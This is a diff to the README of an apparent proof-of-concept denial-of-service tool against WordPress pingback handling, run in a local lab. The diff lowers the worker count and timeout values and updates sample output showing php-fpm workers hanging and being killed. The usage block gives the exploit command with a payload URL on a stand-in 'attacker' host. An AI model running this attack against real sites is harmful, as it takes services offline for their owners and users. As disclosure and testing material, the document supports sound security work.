@@ -48,7 +48,7 @@ Sends the 86-byte payload. Expected outcomes:
 python3 poc/pingback_poc.py \
   --target http://localhost:8080 \
   --payload-url http://attacker:8080/small.br \
-  --mode hang --workers 4 --count 4 --timeout 25 --show-logs
+  --mode hang --workers 1 --count 1 --timeout 12 --show-logs
 ```
 
 ### `--mode crash`
@@ -96,26 +96,32 @@ python3 poc/pingback_poc.py \
 [*] post        : http://localhost:8080/?p=1
 [*] payload     : http://attacker:8080/small.br
 [*] mode        : hang
-[*] concurrency : 4 (4 total)
+[*] concurrency : 1 (1 total)
 
 [*] site before : HTTP 200 in 0.0s
 [1] -> sourceURI=http://attacker:8080/small.br?cb=...
-[2] -> sourceURI=http://attacker:8080/small.br?cb=...
-[3] -> sourceURI=http://attacker:8080/small.br?cb=...
-[4] -> sourceURI=http://attacker:8080/small.br?cb=...
-[1] <- timeout after 25.0s
-...
+[1] <- timeout after 12.0s
 [*] summary
-    hung                     4
-[!] 4 request(s) hung or forced a worker kill
-[*] site after  : timeout after 5.0s (attack took 25.0s)
-[*] waiting 6s for php-fpm to reap stuck workers ...
-[*] site recovered: HTTP 200 in 0.0s
+    hung                     1
+[!] 1 request(s) hung or forced a worker kill
+[*] site after  : HTTP 200 in 0.0s (attack took 12.0s)
+[*] note: the stock php-fpm config has no request_terminate_timeout;
+    PHP-FPM max_execution_time (30s) is the fallback. Use
+    `make restart` to recover immediately.
 
 [*] recent php-fpm / WordPress log lines
-    WARNING: [pool www] child 43 execution timed out (15.0 sec), terminating
-    WARNING: [pool www] child 43 exited on signal 15 (SIGTERM) after 15.1 seconds from start
+    (no matching lines; the request has not reached max_execution_time yet)
 ```
+
+After roughly 30 seconds the worker exits with code 124:
+
+```text
+WARNING: [pool www] child 10 exited with code 124 after 37.713889 seconds from start
+```
+
+With the optional `zz-lab.example.conf` (15-second
+`request_terminate_timeout`), the worker is reaped earlier and the log shows
+`execution timed out` followed by `SIGTERM`.
 
 ## Example output — crash
 
